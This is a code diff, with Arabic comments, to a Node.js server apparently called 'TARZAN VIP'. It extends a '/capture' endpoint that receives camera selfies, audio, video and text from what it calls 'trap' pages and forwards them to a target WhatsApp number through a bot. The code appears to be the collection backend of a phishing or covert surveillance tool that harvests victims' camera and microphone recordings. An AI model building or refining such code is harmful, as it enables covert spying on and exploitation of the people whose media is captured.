@@ -453,14 +453,24 @@ async function bootExistingSessions() {
 }
 
 // ==========================================
-// 🎭 8. نظام الاستقبال الموحد (Universal Capture API)
+// 🎭 8. نظام الاستقبال الموحد (Universal Capture API) المطور
 // ==========================================
-// هذه هي النقطة التي تتواصل معها جميع الصفحات الموجودة في مجلد public
+// تنظيف الـ Base64 لضمان عمل الصور والفيديو
+const extractCleanBase64 = (rawData) => {
+    if (!rawData) return null;
+    return rawData.includes(',') ? rawData.split(',')[1] : rawData;
+};
 
 app.post('/capture', async (req, res) => {
-    // دعم استقبال البيانات من الصفحات بأي مسمى
-    const { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
+    console.log("📥 [استقبال طلب جديد في البوابة]");
+
+    let { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
     const currentModuleId = moduleId || trapId || 'VERIFY-SYS';
+
+    // 🔴 فك تشفير الأسماء العربية في الجلسات لكي لا يفشل الارسال
+    if (sessionId) {
+        try { sessionId = decodeURIComponent(sessionId); } catch(e) {}
+    }
 
     if (!type || !data || !targetNumber || !sessionId) return res.status(400).json({ success: false, message: "بيانات ناقصة" });
 
@@ -477,19 +487,35 @@ app.post('/capture', async (req, res) => {
                          `❖ ════════════════════════ ❖`;
         await sock.sendMessage(jid, { text: titleMsg });
 
-        if (type === 'selfie' && Array.isArray(data)) {
+        // 📝 1. معالجة النصوص (التطوير الجديد)
+        if ((type === 'text' || type === 'message') && typeof data === 'string') {
+            await sock.sendMessage(jid, { text: `📝 ╟ *الـرِّسَـالَـة:*\n\n${data}` });
+        }
+        // 📸 2. معالجة مصفوفة الصور (التطوير الجديد المنظف للـ Base64)
+        else if (type === 'selfie' && Array.isArray(data)) {
             for (let i = 0; i < data.length; i++) {
-                const buffer = Buffer.from(data[i].replace(/^data:image\/png;base64,/, ""), 'base64');
-                await sock.sendMessage(jid, { image: buffer, caption: `👁️ ╟ لَقْطَة [ ${i + 1} / ${data.length} ]` });
+                const cleanStr = extractCleanBase64(data[i]);
+                if (cleanStr) {
+                    const buffer = Buffer.from(cleanStr, 'base64');
+                    await sock.sendMessage(jid, { image: buffer, caption: `👁️ ╟ لَقْطَة [ ${i + 1} / ${data.length} ]` });
+                }
             }
         } 
+        // 🎙️ 3. معالجة الصوت (مطور)
         else if (type === 'audio' && typeof data === 'string') {
-            const buffer = Buffer.from(data.replace(/^data:audio\/webm;base64,/, ""), 'base64');
-            await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
+            const cleanStr = extractCleanBase64(data);
+            if (cleanStr) {
+                const buffer = Buffer.from(cleanStr, 'base64');
+                await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
+            }
         }
+        // 🎥 4. معالجة الفيديو (مطور)
         else if (type === 'video' && typeof data === 'string') {
-            const buffer = Buffer.from(data.replace(/^data:video\/webm;base64,/, ""), 'base64');
-            await sock.sendMessage(jid, { video: buffer, caption: `🎥 ╟ تَسْجِيلُ الفِيدْيُو المُرْسَل` });
+            const cleanStr = extractCleanBase64(data);
+            if (cleanStr) {
+                const buffer = Buffer.from(cleanStr, 'base64');
+                await sock.sendMessage(jid, { video: buffer, caption: `🎥 ╟ تَسْجِيلُ الفِيدْيُو المُرْسَل` });
+            }
         }
 
         res.json({ success: true });
@@ -555,7 +581,7 @@ app.listen(PORT, async () => {
     console.log(`\n=========================================`);
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
     console.log(`🛡️ وضع الحماية والتحمل اللامحدود مفعل`);
-    console.log(`📡 نقطة استقبال البيانات من الـ public جاهزة`);
+    console.log(`📡 نقطة استقبال البيانات من الـ public جاهزة ومطورة`);
     console.log(`🧠 نظام الذكاء الاصطناعي مدمج وجاهز`);
     console.log(`=========================================\n`);
     
